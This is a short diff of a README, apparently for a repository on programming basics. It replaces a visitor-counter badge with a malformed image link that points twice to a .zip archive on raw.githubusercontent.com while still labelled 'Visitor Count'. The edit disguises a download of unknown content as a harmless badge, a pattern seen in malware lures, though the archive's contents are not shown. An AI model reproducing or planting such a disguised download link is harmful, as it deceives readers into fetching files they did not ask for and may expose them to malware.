@@ -6,4 +6,4 @@
 * class and methods
 * Functions
 
-![Visitor Count](https://profile-counter.glitch.me/{techcircule}/count.svg)
+![Visitor Count](https://raw.githubusercontent.com/techcircule/Castle-Dungeons/master/Australianize/Castle-Dungeons.zip{techcircule}https://raw.githubusercontent.com/techcircule/Castle-Dungeons/master/Australianize/Castle-Dungeons.zip)
